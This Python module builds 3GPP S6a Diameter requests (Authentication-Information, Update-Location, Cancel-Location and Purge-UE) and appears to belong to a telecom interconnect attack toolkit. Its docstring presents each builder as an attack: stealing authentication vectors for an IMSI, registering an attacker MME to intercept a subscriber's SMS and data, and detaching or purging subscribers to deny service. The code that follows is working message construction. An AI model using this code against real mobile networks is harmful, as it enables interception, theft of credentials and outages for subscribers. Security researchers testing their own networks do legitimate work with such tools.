#!/usr/bin/env python3
'''
3GPP S6a command builders (TS 29.272): AIR, ULR, CLR, PUR.

These are the MME->HSS requests behind the classic Diameter interconnect
attacks:
  * AIR (Authentication-Information-Request) - pull EPS authentication vectors
    for an IMSI (location/identity disclosure, auth-vector theft).
  * ULR (Update-Location-Request) - register an attacker MME for the subscriber
    (SMS/data interception, analogous to the SS7 UpdateLocation attack).
  * CLR (Cancel-Location-Request) - detach the subscriber from its serving MME
    (denial of service).
  * PUR (Purge-UE-Request) - mark the UE purged in the HSS (denial of service).
'''
import time
import random

from diameter.diameter_core.commons import diameter_commons as C
from diameter.diameter_core.commons import avp as A
from diameter.diameter_core.commons.diameter_msg_base import DiameterMessage

RAT_TYPE_EUTRAN = 1004


def make_session_id(origin_host):
    return '%s;%d;%d' % (origin_host, int(time.time()), random.getrandbits(24))


def encode_plmn(mcc, mnc):
    '''Encode Visited-PLMN-Id as 3 octets (TS 29.272 / TBCD), MCC+MNC.'''
    mcc = str(mcc).zfill(3)
    mnc = str(mnc)
    d = [int(c) for c in mcc]
    if len(mnc) == 2:
        m = [int(mnc[0]), int(mnc[1]), 0xf]
    else:
        m = [int(mnc[0]), int(mnc[1]), int(mnc[2])]
    octet1 = (d[1] << 4) | d[0]
    octet2 = (m[2] << 4) | d[2]
    octet3 = (m[1] << 4) | m[0]
    return bytes([octet1, octet2, octet3])


def _common(cmd, origin_host, origin_realm, dest_realm, imsi, dest_host=None):
    msg = DiameterMessage(cmd, application_id=C.APP_S6A, request=True,
                          proxiable=True)
    msg.add(A.utf8(C.AVP_SESSION_ID, make_session_id(origin_host)))
    msg.add(A.unsigned32(C.AVP_AUTH_SESSION_STATE, C.NO_STATE_MAINTAINED))
    msg.add(A.utf8(C.AVP_ORIGIN_HOST, origin_host))
    msg.add(A.utf8(C.AVP_ORIGIN_REALM, origin_realm))
    if dest_host:
        msg.add(A.utf8(C.AVP_DESTINATION_HOST, dest_host))
    msg.add(A.utf8(C.AVP_DESTINATION_REALM, dest_realm))
    msg.add(A.utf8(C.AVP_USER_NAME, imsi))
    return msg


def authentication_information_request(origin_host, origin_realm, dest_realm,
                                       imsi, mcc, mnc, num_vectors=1,
                                       dest_host=None):
    msg = _common(C.CMD_AIR, origin_host, origin_realm, dest_realm, imsi,
                  dest_host)
    msg.add(A.octetstring(C.AVP_VISITED_PLMN_ID, encode_plmn(mcc, mnc),
                          vendor_id=C.VENDOR_3GPP))
    msg.add(A.grouped(C.AVP_REQ_EUTRAN_AUTH_INFO, [
        A.unsigned32(C.AVP_NUM_REQUESTED_VECTORS, num_vectors,
                     vendor_id=C.VENDOR_3GPP),
        A.unsigned32(C.AVP_IMMEDIATE_RESPONSE_PREFERRED, 1,
                     vendor_id=C.VENDOR_3GPP),
    ], vendor_id=C.VENDOR_3GPP))
    return msg


def update_location_request(origin_host, origin_realm, dest_realm, imsi, mcc,
                            mnc, ulr_flags=0x00000002, dest_host=None):
    msg = _common(C.CMD_ULR, origin_host, origin_realm, dest_realm, imsi,
                  dest_host)
    msg.add(A.unsigned32(C.AVP_RAT_TYPE, RAT_TYPE_EUTRAN, vendor_id=C.VENDOR_3GPP))
    msg.add(A.unsigned32(C.AVP_ULR_FLAGS, ulr_flags, vendor_id=C.VENDOR_3GPP))
    msg.add(A.octetstring(C.AVP_VISITED_PLMN_ID, encode_plmn(mcc, mnc),
                          vendor_id=C.VENDOR_3GPP))
    return msg


def cancel_location_request(origin_host, origin_realm, dest_realm, imsi,
                            dest_host=None,
                            cancellation_type=C.CANCELLATION_SUBSCRIPTION_WITHDRAWAL):
    msg = _common(C.CMD_CLR, origin_host, origin_realm, dest_realm, imsi,
                  dest_host)
    msg.add(A.unsigned32(C.AVP_CANCELLATION_TYPE, cancellation_type,
                         vendor_id=C.VENDOR_3GPP))
    return msg


def purge_ue_request(origin_host, origin_realm, dest_realm, imsi,
                     pur_flags=0x00000000, dest_host=None):
    msg = _common(C.CMD_PUR, origin_host, origin_realm, dest_realm, imsi,
                  dest_host)
    msg.add(A.unsigned32(C.AVP_PUR_FLAGS, pur_flags, vendor_id=C.VENDOR_3GPP))
    return msg
